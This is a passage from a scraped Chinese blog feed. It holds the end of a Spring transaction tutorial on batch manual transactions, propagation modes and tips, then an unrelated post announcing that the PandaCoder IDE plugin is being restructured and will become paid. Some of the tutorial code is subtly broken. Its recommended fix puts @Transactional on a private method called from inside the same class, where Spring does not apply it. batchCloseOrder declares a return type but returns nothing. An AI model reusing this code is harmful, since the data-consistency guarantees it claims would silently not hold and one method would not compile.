<table><thead><tr><th>方式</th><th>代码耦合度</th><th>扩展性</th><th>适用场景</th></tr></thead><tbody><tr><td>TransactionSynchronization</td><td>高（在方法里注册）</td><td>低</td><td>简单场景，1-2个操作</td></tr><tr><td>@TransactionalEventListener</td><td>低（发布订阅）</td><td>高</td><td>复杂场景，多个操作</td></tr></tbody></table>
<p><strong>我的建议</strong>：</p>
<ul>
<li>只有1-2个操作，用TransactionSynchronization</li>
<li>有多个操作，或者可能扩展，用@TransactionalEventListener</li>
</ul>
<p>好处是代码解耦了，要加新功能，写个监听器就行，不用改原方法。</p>
<h3 data-id="heading-24">批量操作必须用手动事务</h3>
<p>批量发货100个订单，其中1个失败了咋办？</p>
<p>如果用<code>@Transactional</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchDelivery</span><span class="hljs-params">(List&lt;Long&gt; orderIds)</span> {
    <span class="hljs-keyword">for</span> (Long orderId : orderIds) {
        <span class="hljs-comment">// 发货逻辑</span>
    }
}
</code></pre>
<p>问题：100个订单在一个事务里，1个失败全部回滚。</p>
<p>但实际需求是：<strong>成功的正常发货，失败的记录下来。</strong></p>
<h4 data-id="heading-25">用PlatformTransactionManager手动控制</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderBatchService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> PlatformTransactionManager transactionManager;
    
    <span class="hljs-keyword">public</span> BatchResult <span class="hljs-title function_">batchDelivery</span><span class="hljs-params">(List&lt;Long&gt; orderIds)</span> {
        
        List&lt;Long&gt; success = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        List&lt;String&gt; failed = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (Long orderId : orderIds) {
            <span class="hljs-comment">// 每个订单一个独立事务</span>
            <span class="hljs-type">DefaultTransactionDefinition</span> <span class="hljs-variable">def</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultTransactionDefinition</span>();
            <span class="hljs-type">TransactionStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> transactionManager.getTransaction(def);
            
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 发货逻辑</span>
                <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
                order.setStatus(<span class="hljs-number">2</span>);  <span class="hljs-comment">// 已发货</span>
                orderMapper.updateById(order);
                reduceStock(order);
                
                <span class="hljs-comment">// 手动提交</span>
                transactionManager.commit(status);
                success.add(orderId);
                
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-comment">// 手动回滚</span>
                transactionManager.rollback(status);
                failed.add(<span class="hljs-string">"订单"</span> + orderId + <span class="hljs-string">"："</span> + e.getMessage());
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BatchResult</span>(success, failed);
    }
}
</code></pre>
<h4 data-id="heading-26">高级用法：设置事务属性</h4>
<p>对于定时任务、后台批处理这种场景，可以显式控制事务属性：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> BatchResult <span class="hljs-title function_">batchCloseOrder</span><span class="hljs-params">(List&lt;Long&gt; orderIds)</span> {
    
    <span class="hljs-keyword">for</span> (Long orderId : orderIds) {
        <span class="hljs-type">DefaultTransactionDefinition</span> <span class="hljs-variable">def</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultTransactionDefinition</span>();
        
        <span class="hljs-comment">// 强制新事务（无论外层是否有事务）</span>
        def.setPropagationBehavior(TransactionDefinition.PROPAGATION_REQUIRES_NEW);
        
        <span class="hljs-comment">// 降低隔离级别，减少锁争用</span>
        def.setIsolationLevel(TransactionDefinition.ISOLATION_READ_COMMITTED);
        
        <span class="hljs-comment">// 设置超时，避免长事务阻塞</span>
        def.setTimeout(<span class="hljs-number">10</span>);
        
        <span class="hljs-type">TransactionStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> transactionManager.getTransaction(def);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
            order.setStatus(<span class="hljs-number">4</span>);  <span class="hljs-comment">// 已关闭</span>
            orderMapper.updateById(order);
            
            transactionManager.commit(status);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            transactionManager.rollback(status);
        }
    }
}
</code></pre>
<h4 data-id="heading-27">三种方式对比</h4>





























<table><thead><tr><th>方式</th><th>事务范围</th><th>一条失败影响</th><th>适用场景</th></tr></thead><tbody><tr><td>@Transactional</td><td>整个批次</td><td>全部回滚</td><td>不适合批量</td></tr><tr><td>手动事务（默认属性）</td><td>每条独立</td><td>只回滚这条</td><td>普通批处理</td></tr><tr><td>手动事务（定制属性）</td><td>每条独立</td><td>只回滚这条</td><td>高并发批处理</td></tr></tbody></table>
<p>我测试了100个订单，97个成功，3个失败。成功的都发货了，失败的记录下来了。</p>
<p><strong>核心价值</strong>：每条数据独立事务，部分失败不影响其他。</p>
<h3 data-id="heading-28">事务传播机制：3种常用场景</h3>
<p>创建订单时，要调另一个方法插入订单商品。两个方法都有<code>@Transactional</code>，会咋样？</p>
<p><strong>7种传播机制</strong>，常用的是3种：REQUIRED、REQUIRES_NEW、NESTED。</p>
<h4 data-id="heading-29">REQUIRED（默认）：同成同败</h4>
<p><strong>行为</strong>：有事务就加入，没有就新建。父子方法共享同一个事务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 父方法</span>
<span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRED)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    createOrderItems(order.getId());  <span class="hljs-comment">// 加入当前事务</span>
}

<span class="hljs-comment">// 子方法</span>
<span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRED)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrderItems</span><span class="hljs-params">(Long orderId)</span> {
    itemMapper.batchInsert(items);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>父子方法在同一个事务里</li>
<li>子方法抛异常 → 整个事务回滚（父也一起回滚）</li>
<li>订单和订单商品"同成同败"</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[createOrder开启事务] --&gt; B[insert order]
    B --&gt; C[createOrderItems加入事务]
    C --&gt; D[insert items]
    D --&gt; E{子方法异常?}
    E --&gt;|是| F[整个事务回滚]
    E --&gt;|否| G[事务提交]
</code></pre>
<p><strong>适用场景</strong>：一个业务流程内的多步骤需要"同成同败"。80%的场景都用这个。</p>
<h4 data-id="heading-30">REQUIRES_NEW：独立事务</h4>
<p><strong>行为</strong>：挂起当前事务，开启一个全新的事务，独立提交/回滚。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 父方法</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    logService.saveLog(log);  <span class="hljs-comment">// 新事务，独立提交</span>
    
    <span class="hljs-comment">// 后面的代码可能失败</span>
}

<span class="hljs-comment">// 子方法</span>
<span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveLog</span><span class="hljs-params">(Log log)</span> {
    logMapper.insert(log);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>子方法失败只影响子事务，父事务不受影响</li>
<li>父事务后续回滚，子事务已提交的结果也保留</li>
<li>日志一定会保存，即使订单创建失败</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[createOrder事务1] --&gt; B[insert order]
    B --&gt; C[挂起事务1]
    C --&gt; D[saveLog开启事务2]
    D --&gt; E[insert log]
    E --&gt; F[事务2提交-日志已保存]
    F --&gt; G[恢复事务1]
    G --&gt; H{事务1继续执行}
    H --&gt;|成功| I[事务1提交]
    H --&gt;|失败| J[事务1回滚-但日志保留]
</code></pre>
<p><strong>适用场景</strong>：必须独立持久化的动作，如：</p>
<ul>
<li>记录审计日志</li>
<li>写消息表</li>
<li>发送通知记录</li>
</ul>
<p>即使主流程失败也不能丢。</p>
<h4 data-id="heading-31">NESTED：局部回滚</h4>
<p><strong>行为</strong>：在同一物理事务内使用"保存点"（Savepoint），子方法相当于子事务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 父方法</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    <span class="hljs-keyword">try</span> {
        createGift(order.getId());  <span class="hljs-comment">// 嵌套事务</span>
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-comment">// 赠品创建失败，但订单继续</span>
        log.warn(<span class="hljs-string">"赠品创建失败，继续处理订单"</span>);
    }
    
    <span class="hljs-comment">// 订单正常提交</span>
}

<span class="hljs-comment">// 子方法</span>
<span class="hljs-meta">@Transactional(propagation = Propagation.NESTED)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createGift</span><span class="hljs-params">(Long orderId)</span> {
    giftMapper.insert(gift);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>子方法回滚只回滚到保存点，不影响父方法已做的操作</li>
<li>父方法回滚会连同子方法一起回滚</li>
<li>需要数据库支持保存点（InnoDB支持）</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[createOrder事务开启] --&gt; B[insert order]
    B --&gt; C[创建保存点]
    C --&gt; D[createGift嵌套事务]
    D --&gt; E{赠品创建}
    
    E --&gt;|失败| F[回滚到保存点]
    F --&gt; G[订单保留]
    G --&gt; H[事务提交]
    
    E --&gt;|成功| I[继续执行]
    I --&gt; H
</code></pre>
<p><strong>适用场景</strong>：主流程可继续，但某个子步骤允许"局部失败回滚"。</p>
<ul>
<li>批处理中某条失败不影响前面已写入的步骤</li>
<li>赠品、优惠券等可选功能</li>
</ul>
<p><strong>注意</strong>：</p>
<ul>
<li>需要使用<code>DataSourceTransactionManager</code>（JPA的不支持）</li>
<li>数据库必须支持保存点（InnoDB支持，MyISAM不支持）</li>
</ul>
<h4 data-id="heading-32">三种传播行为对比</h4>

































<table><thead><tr><th>传播行为</th><th>事务关系</th><th>子方法失败影响</th><th>父方法失败影响</th><th>典型场景</th></tr></thead><tbody><tr><td>REQUIRED</td><td>共享事务</td><td>整个事务回滚</td><td>整个事务回滚</td><td>订单+订单商品</td></tr><tr><td>REQUIRES_NEW</td><td>独立事务</td><td>只回滚子事务</td><td>子事务已提交</td><td>审计日志</td></tr><tr><td>NESTED</td><td>保存点</td><td>回滚到保存点</td><td>整个事务回滚</td><td>赠品、优惠券</td></tr></tbody></table>
<h4 data-id="heading-33">选型建议</h4>
<ul>
<li><strong>默认用REQUIRED</strong>：80%的场景都是"同成同败"</li>
<li><strong>需要独立落盘的用REQUIRES_NEW</strong>：审计日志、消息表</li>
<li><strong>需要局部回滚的用NESTED</strong>：可选功能、批处理</li>
</ul>
<p>我测试了一下，这3种传播行为都符合预期。</p>
<h3 data-id="heading-34">几个要注意的地方</h3>
<h4 data-id="heading-35">事务范围要小</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 不好的写法</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
    List&lt;Data&gt; data = queryBigData();   <span class="hljs-comment">// 慢查询，不需要事务</span>
    <span class="hljs-type">Data</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> calculate(data);      <span class="hljs-comment">// 计算，不需要事务</span>
    mapper.save(result);                <span class="hljs-comment">// 真正需要事务</span>
}

<span class="hljs-comment">// 改成这样</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
    List&lt;Data&gt; data = queryBigData();
    <span class="hljs-type">Data</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> calculate(data);
    saveInTransaction(result);
}

<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveInTransaction</span><span class="hljs-params">(Data data)</span> {
    mapper.save(data);
}
</code></pre>
<p>只把写操作放事务里。</p>
<h4 data-id="heading-36">批量插入要用batchInsert</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 慢</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(List&lt;Item&gt; items)</span> {
    <span class="hljs-keyword">for</span> (Item item : items) {
        mapper.insert(item);  <span class="hljs-comment">// N次数据库访问</span>
    }
}

<span class="hljs-comment">// 快</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(List&lt;Item&gt; items)</span> {
    mapper.batchInsert(items);  <span class="hljs-comment">// 1次数据库访问</span>
}
</code></pre>
<p>我之前不知道这个，踩过坑。1000条数据，循环插入要10秒，批量插入只要0.5秒。</p>
<h4 data-id="heading-37">长事务要设置超时</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(timeout = 30)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">longTask</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 防止锁表</span>
}
</code></pre>
<p>生产环境一定要加这个。</p>
<h3 data-id="heading-38">总结一下</h3>
<p>这6种玩法，每个都能解决实际问题：</p>
<ol>
<li><strong>编程式事务</strong> → 库存不足保留订单</li>
<li><strong>@Transactional参数</strong> → 隔离级别、超时、回滚规则</li>
<li><strong>事务同步器</strong> → 事务提交后发MQ</li>
<li><strong>事务事件监听</strong> → 解耦业务逻辑</li>
<li><strong>手动控制事务</strong> → 批量操作</li>
<li><strong>事务传播机制</strong> → 日志记录、赠品创建</li>
</ol>
<p>80%的场景，<code>@Transactional</code>就够了。遇到特殊情况，再用对应的高级用法。</p>
<p>别过度设计，够用就行。</p>
<h3 data-id="heading-39">代码在这里</h3>
<p>所有代码都是可以跑的，有完整测试用例。</p>
<p>数据库脚本在 doc/simple-transactional-init.sql，导入就能用。</p>
<hr/>
<p><strong>你们平时用Spring事务都遇到过什么坑？</strong></p>
<p><strong>或者有什么好的实践经验？</strong></p>
<p><strong>欢迎在评论区聊聊，我也想学习学习。</strong></p>
<p>特别是事务传播机制那块，我自己还没完全搞透。如果有大佬愿意指点一下，那就太好了。</p>
<hr/>
<p><strong>如果这篇文章对你有帮助，麻烦点个赞👍，让更多人看到。</strong></p>
<p>这篇文章从研究Mall源码到写demo，再到写文章、画图、测试，前后花了两天时间。</p>
<p>希望能帮你解决实际问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PandaCoder 的解构与新生：为中文开发者造一束专注的光]]></title>    <link>https://juejin.cn/post/7575104251866775562</link>    <guid>https://juejin.cn/post/7575104251866775562</guid>    <pubDate>2025-11-23T05:38:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251866775562" data-draft-id="7575182522410926118" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PandaCoder 的解构与新生：为中文开发者造一束专注的光"/> <meta itemprop="keywords" content="IntelliJ IDEA,后端,程序员"/> <meta itemprop="datePublished" content="2025-11-23T05:38:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="舒一笑不秃头"/> <meta itemprop="url" content="https://juejin.cn/user/4257747754552599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PandaCoder 的解构与新生：为中文开发者造一束专注的光
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4257747754552599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    舒一笑不秃头
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T05:38:07.000Z" title="Sun Nov 23 2025 05:38:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>“我不是在做工具，我是在为开发者造光；真正的创造，有时始于勇敢的拆解。”</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b58793b53eb4803b2cf9677750b19da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=K7zAXMrm4fwJrV80JCnI1Ue3mW0%3D" alt="" loading="lazy"/></p>
<p>写下这两句话时，“深圳的雨”刚刚停歇，窗外的空气湿润而清冽，像极了我此刻的心情——平静中带着决断。</p>
<p>PandaCoder，这个以国宝熊猫为名、为中文开发者而生的小插件，已经悄然走过了一段喧嚣与静默交织的旅程。它最初的模样，是我对“高效编程”最朴素的想象：一个能理解中文思维、辅助英文编码、减轻上下文切换负担的智能伙伴。它免费、开源，像一叶轻舟，驶入万千开发者的 IDE 世界。</p>
<p>然而，舟行水上，亦有风浪。</p>
<p>随着用户反馈的积累，我不断为其添砖加瓦：支持 Jenkins Pipeline 的语法高亮、SpringBoot 配置文件的图标识别、AI 驱动的注释翻译、自动生成类名与变量名……功能越来越多，PandaCoder 逐渐从一把轻盈的瑞士军刀，变成一个塞满工具的百宝箱。表面看，它“更强大”了；实则，它开始迷失焦点。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bcc42f13cdd475684758263c39a76bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=EVSxF6fyCbPHGD1ySuwnDqosnpc%3D" alt="" loading="lazy"/></p>
<p>更令人深思的是，在开源世界的开放与共享之外，我也遭遇了意料之外的寒流——一些恶意评论、无端指责，甚至对动机的揣测。这些噪音虽不至于击垮我，却悄然消耗着创造的热忱。我开始反复追问自己：一个开发者工具的终极价值，究竟是功能的多寡，还是它能否在某个深夜，让一位疲惫的程序员会心一笑？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bfa769b0d1c34098a066aba89f64bcd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=fSfJMP9ui03bvlwjxY%2BSx1R0PTI%3D" alt="" loading="lazy"/></p>
<p>纳瓦尔·拉维坎特曾说：“把自己产品化。”这句话曾被简化为一句创业口号，但我越来越体会到它的深意——它是一种承诺：将你独特的洞察、反复打磨的技艺，与对用户深沉的责任感，封装成一个可持续、可复制、能持续创造价值的产品。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/011046c2ef15463db675a8dcbf9c7800~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=FW60wavw%2B5w14zCalnxET5fHeas%3D" alt="" loading="lazy"/></p>
<p>于是，我做出一个艰难但坚定的决定：<strong>解构 PandaCoder，重启产品哲学</strong>。</p>
<p>未来的 PandaCoder，将不再是一个“大而全”的插件，而是拆解为一组<strong>专注、独立、可组合</strong>的微型产品。每一部分都将回归其最本真的价值：</p>
<ul>
<li><strong>中文命名助手</strong>：专注解决“中文想法如何优雅转化为英文标识符”的核心痛点。它不是翻译器，而是你的命名协作者，让类名、变量、方法名如诗般自然流淌。</li>
<li><strong>Jenkins Pipeline 增强模块</strong>：为 CI/CD 脚本开发者提供类 VS Code 的语法高亮、智能补全与错误提示，让 Groovy 脚本不再是一段“黑盒”。</li>
<li><strong>SpringBoot 配置可视化器</strong>：在 <code>application.yml</code> 旁自动渲染数据库、Redis、MQ 等组件图标，让配置结构一目了然，告别“猜配置”的时代。</li>
</ul>
<p>这些模块或将拥有新的名字，但它们共享同一个灵魂：<strong>少即是多，专注即力量</strong>。它们可以独立安装、按需启用，不再强迫用户为用不到的功能买单（无论是性能还是心理成本）。</p>
<p>伴随这次产品形态的重塑，PandaCoder 也将从完全免费开源，转向<strong>轻量付费模式</strong>。这绝非筑起高墙，而是希望建立一种更健康、更郑重的创造者与使用者关系。</p>
<p>付费，是价值的锚点。<br/>
它过滤掉噪音，吸引真正需要并珍视这份价值的同路人；<br/>
它也是我持续投入、深度打磨产品的基石。<br/>
在开源精神与可持续创造之间，我选择一条中间路径：核心逻辑透明、关键体验付费。未来，部分模块仍会保留开源版本，但完整体验将通过订阅支持长期迭代。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4512af03120945ebb380c952f36d44b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=FVR5ox%2BLVUllgEwhj3wiM4cs40I%3D" alt="" loading="lazy"/></p>
<p>我知道，这或许会让一些人遗憾。但我也相信，真正的用户，不会因为价格离开，而会因为价值留下。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1bc0d29215e497fa523470cbe9584ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481087&amp;x-signature=wx5JWvWPvWFszlYUvc1wugfd%2FbE%3D" alt="" loading="lazy"/></p>
<p>这条路或许孤独，但我始终信奉：“<strong>慢即是快</strong>”。在追逐风口与流量的时代，我愿做那个愿意蹲下来，反复打磨一把小刀的人。因为我知道，真正改变编程体验的，往往不是宏大的框架，而是那些在关键时刻“刚刚好”的微小工具。</p>
<p>PandaCoder 的重生，不是一次商业转型，而是一次产品初心的回归。<br/>
我不再追求“所有人都用”，而是渴望“对的人离不开”。</p>
<p>最后，我想对每一位曾使用、反馈、甚至批评过 PandaCoder 的你说一声：谢谢。正是你们的存在，让我不断反思、进化、前行。未来的路，或许不再喧嚣，但会更加坚定。</p>
<p>因为最终，我们共建的不是一个插件，而是一种更优雅、更从容、更属于中文开发者的编程生活方式。</p>
